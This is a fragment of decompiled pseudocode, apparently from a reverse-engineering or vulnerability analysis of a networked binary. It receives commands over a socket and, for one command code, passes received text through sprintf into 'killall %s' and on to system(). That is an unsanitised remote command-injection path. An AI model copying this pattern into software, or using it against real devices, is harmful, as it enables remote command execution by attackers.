// ...
while ( recv(v7, buf, 0x400u, 0) != -1 )
{
    memcpy(&dword_13A58, buf, 0x44u);
    memset(buf, 0, 0x400u);
    sub_A3C4(dword_13A5C, &unk_13A60);
}
// ...
switch ( dword_13A5C )
{
case 4:
    sub_8EB8(&unk_13A60);
    break;
case 5:
    sub_91B8(&unk_13A60);
    break;
case 6:
    sprintf(s, "killall %s", &unk_13A60);
    system(s)
}
// ...
